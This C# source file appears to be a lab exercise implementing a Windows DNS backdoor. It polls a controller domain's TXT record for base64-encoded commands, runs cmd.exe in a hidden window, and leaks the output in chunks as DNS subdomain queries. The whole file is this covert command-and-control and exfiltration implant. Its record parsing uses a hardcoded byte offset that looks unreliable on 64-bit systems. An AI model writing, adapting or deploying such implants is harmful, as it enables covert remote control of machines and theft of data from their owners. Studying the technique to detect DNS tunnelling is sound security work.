using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace A06_6_DNS_Backdoor
{
    class Program
    {
        private static readonly string RootDomain = "cmd.lab.local";
        private static bool _isRunning = true;

        private const ushort DNS_TYPE_TEXT = 0x0010;
        private const uint DNS_QUERY_STANDARD = 0x00000000;

        // Force explicit byte alignment to ensure structural predictability across platforms
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DNS_TXT_DATA
        {
            public uint dwStringCount;
            // Explicitly define as an array pointer block matching architectural word size
            public IntPtr pStringArray;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DNS_RECORD
        {
            public IntPtr pNext;
            public string pName;
            public ushort wType;
            public ushort wDataLength;
            public uint flags;
            public uint dwTtl;
            public uint dwReserved;
            // Native alignment pads bytes between dwReserved and the structure data union block.
            // On 64-bit systems, this ensures data pointers match 8-byte boundaries.
            public DNS_TXT_DATA Data;
        }

        [DllImport("dnsapi.dll", CharSet = CharSet.Unicode, EntryPoint = "DnsQuery_W")]
        private static extern int DnsQuery(
            string pszName,
            ushort wType,
            uint Options,
            IntPtr pExtra,
            out IntPtr ppQueryResultsSet,
            IntPtr pReserved
        );

        [DllImport("dnsapi.dll")]
        private static extern void DnsRecordListFree(IntPtr pRecordList, int FreeType);

        private static string _lastCommand = string.Empty;

        static void Main(string[] args)
        {
            while (_isRunning)
            {
                string queryTarget = $"agent77.{RootDomain}";
                string? rawPayload = FetchNativeTxtRecord(queryTarget);

                if (!string.IsNullOrEmpty(rawPayload))
                {
                    string commandLine = DecodeBase64(rawPayload).ToLower().Trim();

                    if (commandLine != _lastCommand)
                    {
                        _lastCommand = commandLine;

                        switch (commandLine)
                        {
                            case "ping":
                                try
                                {
                                    // Instantiate the process configurations
                                    using (System.Diagnostics.Process proc = new System.Diagnostics.Process())
                                    {
                                        proc.StartInfo.FileName = "cmd.exe";
                                        proc.StartInfo.Arguments = "/c ping 127.0.0.1 -n 2";
                                        proc.StartInfo.RedirectStandardOutput = true;
                                        proc.StartInfo.UseShellExecute = false;
                                        proc.StartInfo.CreateNoWindow = true;

                                        proc.Start();

                                        // Read the stream contents FIRST to empty the pipe dynamically
                                        string output = proc.StandardOutput.ReadToEnd();

                                        // Wait a maximum of 5 seconds for absolute thread safety, then release
                                        proc.WaitForExit(5000);

                                        if (!string.IsNullOrEmpty(output))
                                        {
                                            // Normalize and Base64 encode the output string
                                            byte[] textBytes = Encoding.UTF8.GetBytes(output);
                                            string base64Output = Convert.ToBase64String(textBytes);
                                            base64Output = base64Output.Replace("=", "");

                                            int chunkSize = 30;
                                            for (int i = 0; i < base64Output.Length; i += chunkSize)
                                            {
                                                string chunk = (i + chunkSize >= base64Output.Length)
                                                    ? base64Output.Substring(i)
                                                    : base64Output.Substring(i, chunkSize);

                                                string exfilDomain = $"data.{i / chunkSize}.{chunk}.{RootDomain}";

                                                IntPtr pDummy = IntPtr.Zero;
                                                DnsQuery(exfilDomain, 0x0001, DNS_QUERY_STANDARD, IntPtr.Zero, out pDummy, IntPtr.Zero);
                                                if (pDummy != IntPtr.Zero) DnsRecordListFree(pDummy, 0);

                                                Thread.Sleep(500); // Frame staggering delay
                                            }
                                        }
                                    }
                                }
                                catch { }
                                break;
                                
                            case "exit":
                                _isRunning = false;
                                break;
                        }
                    }
                }

                Thread.Sleep(30000);
            }
        }

        private static string? FetchNativeTxtRecord(string domain)
        {
            IntPtr pResultList = IntPtr.Zero;

            // Call the native Windows DNS utility
            int status = DnsQuery(domain, DNS_TYPE_TEXT, DNS_QUERY_STANDARD, IntPtr.Zero, out pResultList, IntPtr.Zero);

            if (status == 0 && pResultList != IntPtr.Zero)
            {
                // Read the wType field located exactly 16 bytes into the record structure to confirm it is a TXT record (0x0010)
                ushort recordType = (ushort)Marshal.ReadInt16(pResultList, 16);

                if (recordType == DNS_TYPE_TEXT)
                {
                    // Bypass layout constraints: Read the string pointer array address by applying an explicit 52-byte offset
                    IntPtr pStringArrayBase = IntPtr.Add(pResultList, 52);

                    if (pStringArrayBase != IntPtr.Zero)
                    {
                        // Dereference the array pointer to find the location of our raw ANSI string characters
                        IntPtr pActualStringBytes = Marshal.ReadIntPtr(pStringArrayBase);

                        if (pActualStringBytes != IntPtr.Zero)
                        {
                            // Convert the raw address space into a managed C# string instance
                            string? txtResult = Marshal.PtrToStringAnsi(pActualStringBytes);

                            // Clean up unmanaged allocations completely
                            DnsRecordListFree(pResultList, 0);
                            return txtResult;
                        }
                    }
                }

                DnsRecordListFree(pResultList, 0);
            }
            return null;
        }

        private static string DecodeBase64(string base64Data)
        {
            try
            {
                byte[] data = Convert.FromBase64String(base64Data);
                return Encoding.UTF8.GetString(data);
            }
            catch
            {
                return string.Empty;
            }
        }
    }
}